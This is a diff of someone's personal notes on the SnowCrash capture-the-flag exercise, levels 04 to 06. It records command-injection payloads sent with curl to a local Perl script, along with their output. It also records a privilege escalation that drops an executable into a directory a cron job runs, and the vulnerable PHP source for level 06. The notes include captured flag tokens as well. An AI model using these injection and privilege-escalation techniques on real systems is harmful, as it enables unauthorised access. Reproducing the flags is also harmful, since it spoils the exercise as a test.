@@ -58,8 +58,78 @@ Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 level 04 :
 check /etc/www/
 
+test:
+curl http://localhost:4747?ls => blank
+curl http://localhost:4747?x=ls => ls
+curl http://localhost:4747?x=$(ls) => level04.pl
+curl http://192.168.1.147:4747/?x=$(getflag) => Check
+curl: (6) Couldn't resolve host 'flag.Here'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'your'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host ''
+curl: (6) Couldn't resolve host 'Nope'
+curl: (6) Couldn't resolve host 'there'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'no'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host 'here'
+curl: (6) Couldn't resolve host 'for'
+curl: (6) Couldn't resolve host 'you'
+curl: (6) Couldn't resolve host 'sorry.'
+curl: (6) Couldn't resolve host 'Try'
+curl: (6) Couldn't resolve host 'again'
+
+curl http://localhost:4747\?x\=$\(getflag\) => Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+utils cmd : curl -G -d "x=<value>" http://localhost:4747/script.pl
+in web browser (?x=$(getflag)) => 
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+=========================================================
 level 05 :
-check in mail
+check in mail  level05 file => */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+put in crontab -e
+
+level05@SnowCrash:/$ find / -user flag05 2>/dev/null;
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:/usr/sbin$ cat openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+
+find a place where I can create file other than /opt/openarenaserver
+
+"/bin/getflag > /tmp/flag05" in a file + chmod +x
+
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+=========================================================
+level 06 :
+cat level06.php 
+#!/usr/bin/php
+<?php
+function y($m) {
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+    }
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+    }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+# TODO
+create a file to sent to level06 php executable
+=========================================================
 
 level 12 :
 check www
